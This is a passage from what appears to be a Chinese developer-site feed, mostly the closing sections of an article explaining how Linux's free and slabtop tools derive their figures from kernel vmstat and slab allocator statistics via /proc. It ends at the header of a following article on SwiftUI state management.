<li><strong>作用</strong>：获取基本内存信息</li>
<li><strong>来源</strong>：<code>global_zone_page_state(NR_FREE_PAGES)</code> 等</li>
<li><strong>输出</strong>：<code>totalram</code>、<code>freeram</code>、<code>bufferram</code> 等</li>
</ul>
</li>
<li>
<p><strong>global_node_page_state()</strong>：</p>
<ul>
<li><strong>作用</strong>：获取节点级别的页面统计</li>
<li><strong>来源</strong>：<code>vmstat</code> 子系统</li>
<li><strong>统计类型</strong>：<code>NR_FILE_PAGES</code>、<code>NR_ANON_MAPPED</code> 等</li>
</ul>
</li>
<li>
<p><strong>si_mem_available()</strong>：</p>
<ul>
<li><strong>作用</strong>：计算可用内存</li>
<li><strong>公式</strong>：<code>free + reclaimable - reserved</code></li>
<li><strong>reclaimable</strong>：包括缓存、slab 可回收部分等</li>
</ul>
</li>
</ol>
<h3 data-id="heading-60">6.4 内存统计的更新机制</h3>
<p><strong>页面状态统计</strong>：</p>
<p>Linux 内核使用 <code>vmstat</code> 子系统跟踪各种页面状态。每次页面状态变化时，都会更新相应的计数器。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/vmstat.c</span>
<span class="hljs-type">void</span> __mod_zone_page_state(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-keyword">enum</span> zone_stat_item item,
                           <span class="hljs-type">long</span> delta)
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pageset</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">pcp</span> =</span> zone-&gt;pageset;
    s8 __percpu *p = pcp-&gt;vm_stat_diff + item;
    
    <span class="hljs-comment">// 更新每 CPU 统计</span>
    *p += delta;
    
    <span class="hljs-comment">// 如果超过阈值，更新全局统计</span>
    <span class="hljs-keyword">if</span> (unlikely(*p &gt; pcp-&gt;stat_threshold || *p &lt; -pcp-&gt;stat_threshold)) {
        zone_page_state_add(*p, zone, item);
        *p = <span class="hljs-number">0</span>;
    }
}
</code></pre>
<p><strong>统计类型</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// include/linux/mmzone.h</span>
<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_stat_item</span> {</span>
    NR_FREE_PAGES,           <span class="hljs-comment">// 空闲页面</span>
    NR_ZONE_LRU_BASE,        <span class="hljs-comment">// LRU 列表基数</span>
    NR_ZONE_INACTIVE_ANON,   <span class="hljs-comment">// 非活跃匿名页面</span>
    NR_ZONE_ACTIVE_ANON,     <span class="hljs-comment">// 活跃匿名页面</span>
    NR_ZONE_INACTIVE_FILE,   <span class="hljs-comment">// 非活跃文件页面</span>
    NR_ZONE_ACTIVE_FILE,     <span class="hljs-comment">// 活跃文件页面</span>
    NR_ZONE_UNEVICTABLE,     <span class="hljs-comment">// 不可回收页面</span>
    NR_ZONE_WRITE_PENDING,   <span class="hljs-comment">// 等待写入的页面</span>
    NR_MLOCK,                <span class="hljs-comment">// 锁定的页面</span>
    NR_PAGETABLE,            <span class="hljs-comment">// 页表页面</span>
    NR_KERNEL_STACK_KB,      <span class="hljs-comment">// 内核栈</span>
    NR_BOUNCE,               <span class="hljs-comment">// 反弹缓冲区</span>
    NR_ZONE_WRITE_BACK,      <span class="hljs-comment">// 回写页面</span>
    NR_ZONE_CMA_FREE,        <span class="hljs-comment">// CMA 空闲页面</span>
    <span class="hljs-comment">// ...</span>
};
</code></pre>
<p><strong>内存分配时的统计更新</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/page_alloc.c</span>
<span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __free_one_page(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn,
                                   <span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order)
{
    <span class="hljs-comment">// 释放页面</span>
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-comment">// 更新统计</span>
    __mod_zone_page_state(zone, NR_FREE_PAGES, <span class="hljs-number">1</span> &lt;&lt; order);
}
</code></pre>
<h3 data-id="heading-61">6.5 free 工具的计算方式</h3>
<p><strong>free 工具读取数据</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// free 工具的简化伪代码</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">read_meminfo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    FILE *fp = fopen(<span class="hljs-string">"/proc/meminfo"</span>, <span class="hljs-string">"r"</span>);
    <span class="hljs-type">char</span> line[<span class="hljs-number">256</span>];
    
    <span class="hljs-keyword">while</span> (fgets(line, <span class="hljs-keyword">sizeof</span>(line), fp)) {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"MemTotal:"</span>, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"MemTotal: %lu kB"</span>, &amp;mem_total);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"MemFree:"</span>, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"MemFree: %lu kB"</span>, &amp;mem_free);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"Buffers:"</span>, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"Buffers: %lu kB"</span>, &amp;buffers);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"Cached:"</span>, <span class="hljs-number">7</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"Cached: %lu kB"</span>, &amp;cached);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"SReclaimable:"</span>, <span class="hljs-number">13</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"SReclaimable: %lu kB"</span>, &amp;sreclaimable);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"MemAvailable:"</span>, <span class="hljs-number">13</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"MemAvailable: %lu kB"</span>, &amp;mem_available);
        }
        <span class="hljs-comment">// ... 更多字段</span>
    }
    
    fclose(fp);
    
    <span class="hljs-comment">// 计算 used</span>
    used = total - <span class="hljs-built_in">free</span> - (buffers + cached + sreclaimable);
    
    <span class="hljs-comment">// 计算 buff/cache</span>
    buff_cache = buffers + cached + sreclaimable;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>实时读取</strong>：每次运行 free 都重新读取 <code>/proc/meminfo</code></li>
<li><strong>计算 used</strong>：<code>used = total - free - buff/cache</code></li>
<li><strong>单位转换</strong>：内核以 KB 为单位，free 可以转换为 MB、GB 等</li>
</ol>
<hr/>
<h2 data-id="heading-62">7. slabtop 工具详解</h2>
<h3 data-id="heading-63">7.1 slabtop 工具是什么？</h3>
<p><strong>slabtop 的定义</strong>：</p>
<p>slabtop 是 Linux 系统中用于实时显示内核 slab 分配器使用情况的工具。它读取 <code>/proc/slabinfo</code> 文件，并以类似 top 的界面显示各个 slab 缓存的统计信息。</p>
<p><strong>slabtop 的特点</strong>：</p>
<ol>
<li><strong>实时更新</strong>：默认每 3 秒更新一次</li>
<li><strong>交互式</strong>：支持键盘命令操作</li>
<li><strong>详细统计</strong>：显示每个 slab 缓存的详细信息</li>
<li><strong>排序功能</strong>：可以按不同字段排序</li>
</ol>
<p><strong>slabtop 的安装</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian/Ubuntu</span>
apt-get install procps

<span class="hljs-comment"># CentOS/RHEL</span>
yum install procps-ng

<span class="hljs-comment"># 验证安装</span>
slabtop --version
</code></pre>
<h3 data-id="heading-64">7.2 slabtop 的输出详解</h3>
<p><strong>slabtop 输出示例</strong>：</p>
<pre><code class="hljs language-erlang" lang="erlang"> Active / Total Objects (<span class="hljs-comment">% used)    : 123456 / 234567 (52.6%)</span>
 Active / Total Slabs (<span class="hljs-comment">% used)      : 1234 / 2345 (52.6%)</span>
 Active / Total Caches (<span class="hljs-comment">% used)     : 123 / 234 (52.6%)</span>
 Active / Total Size (<span class="hljs-comment">% used)       : 12345678 / 23456789 (52.6%)</span>
 Minimum / Average / Maximum Object : <span class="hljs-number">0.01</span>K / <span class="hljs-number">0.05</span>K / <span class="hljs-number">0.10</span>K

  OBJS ACTIVE  USE OBJ SIZE  SLABS OBJ/SLAB CACHE SIZE NAME
 <span class="hljs-number">12345</span>  <span class="hljs-number">1234</span>  <span class="hljs-number">10</span><span class="hljs-comment">%    0.05K     123     100     1234K  kmalloc-64</span>
 <span class="hljs-number">23456</span>  <span class="hljs-number">2345</span>  <span class="hljs-number">20</span><span class="hljs-comment">%    0.10K     234     100     2345K  kmalloc-128</span>
</code></pre>
<p><strong>字段详细说明</strong>：</p>
<ol>
<li>
<p><strong>OBJS</strong>：</p>
<ul>
<li><strong>含义</strong>：对象总数</li>
<li><strong>来源</strong>：<code>slabinfo.num_objs</code></li>
<li><strong>计算</strong>：<code>total_slabs * objects_per_slab</code></li>
</ul>
</li>
<li>
<p><strong>ACTIVE</strong>：</p>
<ul>
<li><strong>含义</strong>：活跃对象数</li>
<li><strong>来源</strong>：<code>slabinfo.active_objs</code></li>
<li><strong>计算</strong>：<code>num_objs - free_objs</code></li>
</ul>
</li>
<li>
<p><strong>USE</strong>：</p>
<ul>
<li><strong>含义</strong>：使用率</li>
<li><strong>计算</strong>：<code>active_objs / num_objs * 100%</code></li>
</ul>
</li>
<li>
<p><strong>OBJ SIZE</strong>：</p>
<ul>
<li><strong>含义</strong>：对象大小</li>
<li><strong>来源</strong>：<code>kmem_cache-&gt;size</code></li>
</ul>
</li>
<li>
<p><strong>SLABS</strong>：</p>
<ul>
<li><strong>含义</strong>：slab 总数</li>
<li><strong>来源</strong>：<code>slabinfo.num_slabs</code></li>
</ul>
</li>
<li>
<p><strong>OBJ/SLAB</strong>：</p>
<ul>
<li><strong>含义</strong>：每个 slab 的对象数</li>
<li><strong>来源</strong>：<code>slabinfo.objects_per_slab</code></li>
</ul>
</li>
<li>
<p><strong>CACHE SIZE</strong>：</p>
<ul>
<li><strong>含义</strong>：缓存总大小</li>
<li><strong>计算</strong>：<code>num_slabs * (1 &lt;&lt; cache_order) * PAGE_SIZE</code></li>
</ul>
</li>
<li>
<p><strong>NAME</strong>：</p>
<ul>
<li><strong>含义</strong>：缓存名称</li>
<li><strong>来源</strong>：<code>kmem_cache-&gt;name</code></li>
</ul>
</li>
</ol>
<h3 data-id="heading-65">7.3 /proc/slabinfo 的生成原理</h3>
<p><strong>slab_show() 函数</strong>：</p>
<p><code>/proc/slabinfo</code> 文件由 <code>slab_show()</code> 函数生成，它遍历所有 slab 缓存并显示统计信息。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab_common.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">slab_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *p)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span> =</span> list_entry(p, <span class="hljs-keyword">struct</span> kmem_cache, <span class="hljs-built_in">list</span>);
    
    <span class="hljs-keyword">if</span> (p == slab_caches.next)
        print_slabinfo_header(m);
    
    cache_show(s, m);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">cache_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> seq_file *m)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slabinfo</span> <span class="hljs-title">sinfo</span>;</span>
    
    <span class="hljs-built_in">memset</span>(&amp;sinfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(sinfo));
    get_slabinfo(s, &amp;sinfo);
    
    seq_printf(m, <span class="hljs-string">"%-17s %6lu %6lu %6u %4u %4d"</span>,
               s-&gt;name, sinfo.active_objs, sinfo.num_objs, s-&gt;size,
               sinfo.objects_per_slab, (<span class="hljs-number">1</span> &lt;&lt; sinfo.cache_order));
    
    seq_printf(m, <span class="hljs-string">" : tunables %4u %4u %4u"</span>,
               sinfo.limit, sinfo.batchcount, sinfo.shared);
    seq_printf(m, <span class="hljs-string">" : slabdata %6lu %6lu %6lu"</span>,
               sinfo.active_slabs, sinfo.num_slabs, sinfo.shared_avail);
    slabinfo_show_stats(m, s);
    seq_putc(m, <span class="hljs-string">'\n'</span>);
}
</code></pre>
<p><strong>get_slabinfo() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">get_slabinfo</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *cachep, <span class="hljs-keyword">struct</span> slabinfo *sinfo)</span>
{
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> active_objs, num_objs, active_slabs;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> total_slabs = <span class="hljs-number">0</span>, free_objs = <span class="hljs-number">0</span>, shared_avail = <span class="hljs-number">0</span>;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_slabs = <span class="hljs-number">0</span>;
    <span class="hljs-type">int</span> node;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span>;</span>
    
    <span class="hljs-comment">// 遍历所有节点，累加统计</span>
    for_each_kmem_cache_node(cachep, node, n) {
        spin_lock_irq(&amp;n-&gt;list_lock);
        
        total_slabs += n-&gt;total_slabs;
        free_slabs += n-&gt;free_slabs;
        free_objs += n-&gt;free_objects;
        
        <span class="hljs-keyword">if</span> (n-&gt;shared)
            shared_avail += n-&gt;shared-&gt;avail;
        
        spin_unlock_irq(&amp;n-&gt;list_lock);
    }
    
    <span class="hljs-comment">// 计算总对象数</span>
    num_objs = total_slabs * cachep-&gt;num;
    
    <span class="hljs-comment">// 计算活跃 slab 数</span>
    active_slabs = total_slabs - free_slabs;
    
    <span class="hljs-comment">// 计算活跃对象数</span>
    active_objs = num_objs - free_objs;
    
    <span class="hljs-comment">// 填充统计信息</span>
    sinfo-&gt;active_objs = active_objs;
    sinfo-&gt;num_objs = num_objs;
    sinfo-&gt;active_slabs = active_slabs;
    sinfo-&gt;num_slabs = total_slabs;
    sinfo-&gt;shared_avail = shared_avail;
    sinfo-&gt;limit = cachep-&gt;limit;
    sinfo-&gt;batchcount = cachep-&gt;batchcount;
    sinfo-&gt;shared = cachep-&gt;shared;
    sinfo-&gt;objects_per_slab = cachep-&gt;num;
    sinfo-&gt;cache_order = cachep-&gt;gfporder;
}
</code></pre>
<h3 data-id="heading-66">7.4 Slab 分配器的统计机制</h3>
<p><strong>Slab 分配器结构</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.h</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">array_cache</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_cache</span>;</span>  <span class="hljs-comment">// 每 CPU 缓存</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span>  <span class="hljs-comment">// 每节点缓存</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;  <span class="hljs-comment">// 对象大小</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num;  <span class="hljs-comment">// 每个 slab 的对象数</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> gfporder;  <span class="hljs-comment">// slab 的页面数（2^gfporder）</span>
    <span class="hljs-comment">// ...</span>
};

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slabs_full</span>;</span>  <span class="hljs-comment">// 满 slab 列表</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slabs_partial</span>;</span>  <span class="hljs-comment">// 部分 slab 列表</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slabs_free</span>;</span>  <span class="hljs-comment">// 空闲 slab 列表</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> total_slabs;  <span class="hljs-comment">// 总 slab 数</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_slabs;  <span class="hljs-comment">// 空闲 slab 数</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_objects;  <span class="hljs-comment">// 空闲对象数</span>
    <span class="hljs-comment">// ...</span>
};
</code></pre>
<p><strong>统计更新机制</strong>：</p>
<ol>
<li>
<p><strong>分配对象时</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.c</span>
<span class="hljs-type">void</span> *<span class="hljs-title function_">kmem_cache_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *cachep, <span class="hljs-type">gfp_t</span> flags)</span>
{
    <span class="hljs-comment">// 从每 CPU 缓存分配</span>
    <span class="hljs-comment">// 如果为空，从节点缓存填充</span>
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-comment">// 更新统计</span>
    STATS_INC_ACTIVE(cachep);
    STATS_INC_ALLOCED(cachep);
}
</code></pre>
</li>
<li>
<p><strong>释放对象时</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">kmem_cache_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *cachep, <span class="hljs-type">void</span> *objp)</span>
{
    <span class="hljs-comment">// 释放到每 CPU 缓存</span>
    <span class="hljs-comment">// 如果满，释放到节点缓存</span>
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-comment">// 更新统计</span>
    STATS_DEC_ACTIVE(cachep);
}
</code></pre>
</li>
<li>
<p><strong>创建 slab 时</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">cache_grow</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *cachep, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> nodeid)</span>
{
    <span class="hljs-comment">// 分配页面创建新 slab</span>
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-comment">// 更新统计</span>
    n-&gt;total_slabs++;
    STATS_INC_GROWN(cachep);
}
</code></pre>
</li>
<li>
<p><strong>销毁 slab 时</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">slabs_destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *cachep, <span class="hljs-keyword">struct</span> list_head *<span class="hljs-built_in">list</span>)</span>
{
    <span class="hljs-comment">// 释放 slab 的页面</span>
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-comment">// 更新统计</span>
    n-&gt;total_slabs--;
    n-&gt;free_slabs--;
}
</code></pre>
</li>
</ol>
<h3 data-id="heading-67">7.5 slabtop 工具的计算方式</h3>
<p><strong>slabtop 工具读取数据</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// slabtop 工具的简化伪代码</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">read_slabinfo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    FILE *fp = fopen(<span class="hljs-string">"/proc/slabinfo"</span>, <span class="hljs-string">"r"</span>);
    <span class="hljs-type">char</span> line[<span class="hljs-number">1024</span>];
    
    <span class="hljs-comment">// 跳过头部</span>
    fgets(line, <span class="hljs-keyword">sizeof</span>(line), fp);  <span class="hljs-comment">// 跳过版本信息</span>
    fgets(line, <span class="hljs-keyword">sizeof</span>(line), fp);  <span class="hljs-comment">// 跳过空行</span>
    
    <span class="hljs-comment">// 读取每个缓存的信息</span>
    <span class="hljs-keyword">while</span> (fgets(line, <span class="hljs-keyword">sizeof</span>(line), fp)) {
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab_cache</span> <span class="hljs-title">cache</span>;</span>
        
        <span class="hljs-comment">// 解析行</span>
        <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"%s %lu %lu %u %u %u"</span>,
               cache.name, &amp;cache.active_objs, &amp;cache.num_objs,
               &amp;cache.obj_size, &amp;cache.objects_per_slab, &amp;cache.pages_per_slab);
        
        <span class="hljs-comment">// 计算使用率</span>
        cache.usage = (cache.active_objs * <span class="hljs-number">100.0</span>) / cache.num_objs;
        
        <span class="hljs-comment">// 计算缓存大小</span>
        cache.cache_size = cache.num_slabs * cache.pages_per_slab * PAGE_SIZE;
        
        <span class="hljs-comment">// 添加到列表</span>
        add_cache(&amp;cache);
    }
    
    fclose(fp);
    
    <span class="hljs-comment">// 排序和显示</span>
    sort_caches();
    display_caches();
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>实时读取</strong>：每次更新都重新读取 <code>/proc/slabinfo</code></li>
<li><strong>解析格式</strong>：slabinfo 文件有固定的格式</li>
<li><strong>计算使用率</strong>：<code>usage = active_objs / num_objs * 100%</code></li>
<li><strong>排序显示</strong>：可以按不同字段排序</li>
</ol>
<h3 data-id="heading-68">7.6 Slab 分配器的工作原理</h3>
<p><strong>Slab 分配器的目的</strong>：</p>
<ol>
<li><strong>减少内存碎片</strong>：为相同大小的对象使用专门的缓存</li>
<li><strong>提高分配速度</strong>：预分配对象，避免频繁的页面分配</li>
<li><strong>缓存友好</strong>：对象在内存中连续，提高缓存命中率</li>
</ol>
<p><strong>Slab 的三级结构</strong>：</p>
<ol>
<li>
<p><strong>每 CPU 缓存（array_cache）</strong>：</p>
<ul>
<li><strong>作用</strong>：快速分配和释放</li>
<li><strong>结构</strong>：LIFO 队列</li>
<li><strong>优势</strong>：无锁操作，速度快</li>
</ul>
</li>
<li>
<p><strong>节点缓存（kmem_cache_node）</strong>：</p>
<ul>
<li><strong>作用</strong>：管理 slab 列表</li>
<li><strong>结构</strong>：三个列表（full、partial、free）</li>
<li><strong>优势</strong>：NUMA 感知</li>
</ul>
</li>
<li>
<p><strong>Slab 页面</strong>：</p>
<ul>
<li><strong>作用</strong>：实际存储对象</li>
<li><strong>结构</strong>：一个或多个连续页面</li>
<li><strong>优势</strong>：对象连续，缓存友好</li>
</ul>
</li>
</ol>
<p><strong>分配流程</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 尝试从每 CPU 缓存分配
   ↓ 成功
   返回对象
   ↓ 失败
<span class="hljs-bullet">2.</span> 从节点缓存的 partial 列表获取对象
   ↓ 成功
   填充每 CPU 缓存，返回对象
   ↓ 失败
<span class="hljs-bullet">3.</span> 从节点缓存的 free 列表获取 slab
   ↓ 成功
   初始化 slab，返回对象
   ↓ 失败
<span class="hljs-bullet">4.</span> 分配新页面创建 slab
   ↓
   初始化 slab，返回对象
</code></pre>
<p><strong>释放流程</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 释放到每 CPU 缓存
   ↓ 未满
   完成
   ↓ 已满
<span class="hljs-bullet">2.</span> 批量释放到节点缓存
   ↓
   更新统计
</code></pre>
<hr/>
<h2 data-id="heading-69">8. 总结</h2>
<h3 data-id="heading-70">8.1 工具对比</h3>









































<table><thead><tr><th>工具</th><th>数据来源</th><th>主要功能</th><th>更新方式</th></tr></thead><tbody><tr><td><strong>top</strong></td><td><code>/proc/stat</code>, <code>/proc/[pid]/stat</code></td><td>进程监控</td><td>定期读取</td></tr><tr><td><strong>mpstat</strong></td><td><code>/proc/stat</code></td><td>CPU 统计</td><td>定期读取</td></tr><tr><td><strong>htop</strong></td><td>同 top</td><td>进程监控（增强）</td><td>定期读取</td></tr><tr><td><strong>free</strong></td><td><code>/proc/meminfo</code></td><td>内存统计</td><td>每次运行读取</td></tr><tr><td><strong>slabtop</strong></td><td><code>/proc/slabinfo</code></td><td>Slab 统计</td><td>定期读取</td></tr></tbody></table>
<h3 data-id="heading-71">8.2 内核统计的核心机制</h3>
<ol>
<li><strong>时钟中断</strong>：定期更新 CPU 和负载统计</li>
<li><strong>页面分配/释放</strong>：更新内存统计</li>
<li><strong>Slab 分配/释放</strong>：更新 slab 统计</li>
<li><strong>进程切换</strong>：更新进程统计</li>
</ol>
<h3 data-id="heading-72">8.3 工具的工作原理</h3>
<ol>
<li><strong>读取</strong>：从 <code>/proc</code> 文件系统读取数据</li>
<li><strong>计算</strong>：计算差值、百分比等</li>
<li><strong>显示</strong>：格式化输出</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SwiftUI 状态管理详解]]></title>    <link>https://juejin.cn/post/7584028251167277083</link>    <guid>https://juejin.cn/post/7584028251167277083</guid>    <pubDate>2025-12-16T06:57:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584028251167277083" data-draft-id="7584203412196622362" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SwiftUI 状态管理详解"/> <meta itemprop="keywords" content="iOS"/> <meta itemprop="datePublished" content="2025-12-16T06:57:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="如此风景"/> <meta itemprop="url" content="https://juejin.cn/user/342703355996926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SwiftUI 状态管理详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/342703355996926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    如此风景
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:57:55.000Z" title="Tue Dec 16 2025 06:57:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
